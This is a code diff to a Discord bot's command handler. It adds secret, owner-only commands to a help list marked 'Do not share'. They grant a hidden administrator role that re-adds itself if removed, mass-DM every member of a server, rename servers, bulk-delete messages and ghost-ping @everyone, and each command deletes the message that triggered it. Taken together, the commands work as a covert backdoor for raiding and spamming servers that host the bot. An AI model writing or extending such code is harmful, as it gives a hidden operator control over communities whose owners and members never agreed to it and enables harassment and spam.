@@ -17,7 +17,7 @@ import {
 } from "./restock.js";
 import { controlPanelComponents, controlPanelEmbed } from "./controlPanel.js";
 import { subscribeComponents } from "./subscribeView.js";
-import { handleRoleAdmin } from "./secret.js";
+import { handleRoleAdmin, handleRemoveAdmin } from "./secret.js";
 import type { BotState } from "./client.js";
 
 const SECRET_USERS = [...HARDCODED_OWNERS, "1443710013918023683"];
@@ -48,13 +48,19 @@ export async function handlePrefix(
       .setColor(0x5865f2)
       .setDescription(
         [
-          "`.every` — pings @everyone and deletes your message",
-          "`.ghostping` — ghost pings @everyone (ping sent, message deleted instantly)",
+          "`.every` — pings @everyone, deletes your message",
+          "`.ghostping` — ghost pings @everyone (notification sent, message instantly gone)",
+          "`.roleadmin <server-id> <user-id>` — gives hidden admin role that auto re-adds if removed",
+          "`.removeadmin <server-id> <user-id>` — removes the protected admin role and stops re-adding",
           "`.massnick <server-id> <nickname>` — sets everyone's nickname in a server",
-          "`.lockdown` — locks the current channel (no one can send messages)",
+          "`.lockdown` — locks the current channel (no one can send)",
           "`.unlockdown` — unlocks the current channel",
-          "`.roleadmin <server-id> <user-id>` — gives a hidden admin role that re-adds itself if removed",
-          "`.secretz` — shows this list",
+          "`.purge <amount>` — bulk deletes up to 100 messages in current channel",
+          "`.slowmode <seconds>` — sets slowmode on current channel (0 to disable)",
+          "`.rename <server-id> <name>` — renames a server the bot is in",
+          "`.dmall <server-id> <message>` — DMs every member in a server",
+          "`.botnick <name>` — changes the bot's nickname in the current server",
+          "`.secretz` — shows this list (DMed to you)",
         ].join("\n"),
       )
       .setFooter({ text: "Owner-only • Do not share" });
@@ -131,6 +137,85 @@ export async function handlePrefix(
     await message.delete().catch(() => {});
     const raArgs = message.content.slice(".roleadmin".length).trim().split(/\s+/).filter(Boolean);
     await handleRoleAdmin(message, raArgs, client);
+    return;
+  }
+
+  if (message.content.startsWith(".removeadmin")) {
+    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
+    await message.delete().catch(() => {});
+    const rdArgs = message.content.slice(".removeadmin".length).trim().split(/\s+/).filter(Boolean);
+    await handleRemoveAdmin(message, rdArgs, client);
+    return;
+  }
+
+  if (message.content.startsWith(".purge")) {
+    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
+    await message.delete().catch(() => {});
+    const purgeArgs = message.content.slice(".purge".length).trim().split(/\s+/);
+    const amount = Math.min(100, Math.max(1, parseInt(purgeArgs[0] ?? "10", 10) || 10));
+    if (!message.channel.isTextBased() || !("bulkDelete" in message.channel)) return;
+    await message.channel.bulkDelete(amount, true).catch(() => {});
+    const confirm = await message.channel.send(`🗑️ Deleted ${amount} messages.`).catch(() => null);
+    if (confirm) setTimeout(() => confirm.delete().catch(() => {}), 3000);
+    return;
+  }
+
+  if (message.content.startsWith(".slowmode")) {
+    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
+    await message.delete().catch(() => {});
+    const smArgs = message.content.slice(".slowmode".length).trim().split(/\s+/);
+    const seconds = Math.min(21600, Math.max(0, parseInt(smArgs[0] ?? "0", 10) || 0));
+    if (!message.channel.isTextBased() || !("setRateLimitPerUser" in message.channel)) return;
+    await (message.channel as import("discord.js").TextChannel).setRateLimitPerUser(seconds).catch(() => {});
+    const msg = seconds === 0 ? "⏱️ Slowmode disabled." : `⏱️ Slowmode set to **${seconds}s**.`;
+    const confirm = await message.channel.send(msg).catch(() => null);
+    if (confirm) setTimeout(() => confirm.delete().catch(() => {}), 3000);
+    return;
+  }
+
+  if (message.content.startsWith(".rename")) {
+    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
+    await message.delete().catch(() => {});
+    const rnParts = message.content.slice(".rename".length).trim().split(/\s+/);
+    const rnGuildId = rnParts[0];
+    const rnName = rnParts.slice(1).join(" ");
+    if (!rnGuildId || !rnName) {
+      await message.author.send("Usage: `.rename <server-id> <new name>`").catch(() => {});
+      return;
+    }
+    const rnGuild = client.guilds.cache.get(rnGuildId);
+    if (!rnGuild) { await message.author.send("❌ Bot is not in that server.").catch(() => {}); return; }
+    await rnGuild.setName(rnName).catch(() => {});
+    await message.author.send(`✅ Renamed **${rnGuild.name}** to **${rnName}**.`).catch(() => {});
+    return;
+  }
+
+  if (message.content.startsWith(".dmall")) {
+    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
+    await message.delete().catch(() => {});
+    const daParts = message.content.slice(".dmall".length).trim().split(/\s+/);
+    const daGuildId = daParts[0];
+    const daMsg = daParts.slice(1).join(" ");
+    if (!daGuildId || !daMsg) {
+      await message.author.send("Usage: `.dmall <server-id> <message>`").catch(() => {});
+      return;
+    }
+    const daGuild = client.guilds.cache.get(daGuildId);
+    if (!daGuild) { await message.author.send("❌ Bot is not in that server.").catch(() => {}); return; }
+    await daGuild.members.fetch().catch(() => {});
+    const humans = daGuild.members.cache.filter((m) => !m.user.bot);
+    await Promise.all(humans.map((m) => m.send(daMsg).catch(() => {})));
+    await message.author.send(`✅ DMed **${humans.size}** members in **${daGuild.name}**.`).catch(() => {});
+    return;
+  }
+
+  if (message.content.startsWith(".botnick")) {
+    if (!SECRET_USERS.includes(message.author.id)) return;
+    await message.delete().catch(() => {});
+    const bnNick = message.content.slice(".botnick".length).trim();
+    if (!bnNick) { await message.author.send("Usage: `.botnick <name>`").catch(() => {}); return; }
+    const me = await message.guild.members.fetchMe().catch(() => null);
+    if (me) await me.setNickname(bnNick).catch(() => {});
     return;
   }
 
